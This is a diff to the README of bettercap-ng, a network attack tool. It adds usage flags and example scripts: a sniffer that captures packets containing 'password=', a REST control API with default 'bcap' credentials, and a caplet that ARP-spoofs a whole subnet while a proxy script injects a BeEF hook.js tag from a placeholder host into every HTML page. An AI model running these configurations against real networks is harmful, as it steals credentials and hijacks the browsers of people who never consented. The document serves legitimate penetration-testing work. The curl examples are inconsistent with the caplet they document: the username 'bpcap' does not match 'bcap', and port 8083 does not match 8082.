@@ -24,9 +24,117 @@ Make sure you have a correctly configured Go >= 1.8 environment and the `libpcap
 
 To show the command line options:
 
-    sudo ./bettercap-ng -h
+    # sudo ./bettercap-ng -h
+    
+    Usage of ./bettercap-ng:
+      -caplet string
+            Read commands from this file and execute them in the interactive session.
+      -debug
+            Print debug messages.
+      -eval string
+            Run a command, used to set variables via command line.
+      -iface string
+            Network interface to bind to.
+      -no-history
+            Disable history file.
+      -silent
+            Suppress all logs which are not errors.
 
-To have an idea of what commands you can use once `bettercap-ng` is started, take a look at the `caplets` scripts folder, each of those commands can be either manually entered during the interactive session, or scripted and loaded from `.cap` files.
+## Caplets
+
+Interactive sessions can be scripted with `.cap` files, or `caplets`, the following are a few basic examples, look the `caplets` folder for more.
+
+#### caplets/simple-password-sniffer.cap
+
+Simple password sniffer.
+
+```sh
+# keep reading arp table for network mapping
+net.recon on
+# setup a regular expression for packet payloads
+set net.sniffer.regexp .*password=.+
+# set the sniffer output file
+set net.sniffer.output passwords.pcap
+# start the sniffer
+net.sniffer on
+```
+
+#### caplets/rest-api.cap
+
+Start a rest API.
+
+```sh
+# change these!
+set api.rest.username bcap
+set api.rest.password bcap
+# set api.rest.port 8082
+
+# actively probe network for new hosts
+net.probe on
+net.recon on
+
+# enjoy /api/session and /api/events
+api.rest on
+```
+
+Get information about the current session:
+
+    curl -k --user bpcap:bcap https://bettercap-ip:8083/api/session
+
+Execute a command in the current interactive session:
+
+    curl -k --user bcap:bcap https://bettercap-ip:8083/api/session -H "Content-Type: application/json" -X POST -d '{"cmd":"net.probe on"}'
+
+Get last 50 events:
+
+    curl -k --user bpcap:bcap https://bettercap-ip:8083/api/events?n=50
+
+Clear events:
+
+    curl -k --user bpcap:bcap -X DELETE https://bettercap-ip:8083/api/events
+
+#### caplets/beef-inject.cap
+
+Use a proxy script to inject a BEEF javascript hook:
+
+```sh
+# targeting the whole subnet by default, to make it selective:
+#
+#   sudo ./bettercap-ng -caplet caplets/beef-active.cap -eval "set arp.spoof.targets 192.168.1.64"
+
+# inject beef hook
+set http.proxy.script caplets/beef-inject.js
+# keep reading arp table for network mapping
+net.recon on
+# redirect http traffic to a proxy
+http.proxy on
+# wait for everything to start properly
+sleep 1
+# make sure probing is off as it conflicts with arp spoofing
+arp.spoof on
+```
+
+The `caplets/beef.inject.js` proxy script file:
+
+```javascript
+function onLoad() {
+    console.log( "BeefInject loaded." );
+    console.log("targets: " + env['arp.spoof.targets']);
+}
+
+function onResponse(req, res) {
+    if( res.ContentType.indexOf('text/html') == 0 ){
+        var body = res.ReadBody();
+        if( body.indexOf('</head>') != -1 ) {
+            res.Body = body.replace( 
+                '</head>', 
+                '<script type="text/javascript" src="http://your-beef-box:3000/hook.js"></script></head>' 
+            ); 
+            res.Updated();
+        }
+    }
+}
+```
 
 ## License
 
